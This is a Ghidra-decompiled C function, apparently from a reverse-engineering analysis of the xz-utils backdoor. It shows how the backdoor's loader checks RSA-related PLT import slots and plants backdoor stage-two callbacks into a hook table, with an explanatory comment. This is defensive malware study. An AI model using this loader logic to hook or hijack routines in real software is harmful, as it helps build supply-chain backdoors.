// /home/kali/xzre-ghidra/xzregh/102890_init_imported_funcs.c
// Function: init_imported_funcs @ 0x102890
// Calling convention: unknown
// Prototype: undefined init_imported_funcs(void)


/*
 * AutoDoc: Validates that the loader resolved all 0x1d imports and, crucially, that the RSA-related PLT
 * entries are non-null. If any of the three slots are missing it drops in loader callbacks
 * (`backdoor_init_stage2` and `init_shared_globals`) so the hook table never points at garbage.
 * Otherwise it reports success and the caller can start re-pointing the mm hooks at the real
 * OpenSSL routines.
 */
#include "xzre_types.h"


undefined8 init_imported_funcs(long param_1)

{
  if (*(int *)(param_1 + 0x120) == 0x1d) {
    if (*(long *)(param_1 + 0x18) != 0) {
      return 1;
    }
    if (*(long *)(param_1 + 0x20) != 0) {
      return 1;
    }
    if (*(long *)(param_1 + 0x28) != 0) {
      return 1;
    }
    *(code **)(param_1 + 0x18) = backdoor_init_stage2;
    *(code **)(param_1 + 0x28) = init_shared_globals;
  }
  return 0;
}

